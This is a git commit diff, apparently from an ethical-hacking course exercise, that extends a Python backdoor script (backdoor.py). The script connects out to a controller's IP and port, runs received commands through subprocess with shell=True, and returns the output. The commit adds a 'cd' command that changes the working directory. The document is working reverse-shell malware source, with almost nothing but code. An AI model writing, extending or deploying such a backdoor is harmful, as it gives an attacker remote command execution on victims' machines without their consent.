a33edfdf431d6a85b22e11b74bd870be8acc4a92
Sumeet Singh <sumeet605@gmail.com>
2024-08-07 20:01:51 -0400

    asas

--- 10_Backdoor/backdoor.py
+++ 10_Backdoor/backdoor.py
@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import json
+import os
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -20,6 +21,10 @@ class Backdoor:
             return subprocess.check_output(command, shell=True)
         except:
             return "Command Failed."
+        
+    def change_working_directory(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
 
     def run(self):
         while True:
@@ -27,8 +32,10 @@ class Backdoor:
             if command[0] == "exit":
                 self.connection.close()
                 exit()
-                
-            command_result = self.execute_system_command(command)
+            elif command[0] == "cd" and len(command) > 1:
+                command_result = self.change_working_directory(command[1])
+            else:
+                command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
         connection.close()
 
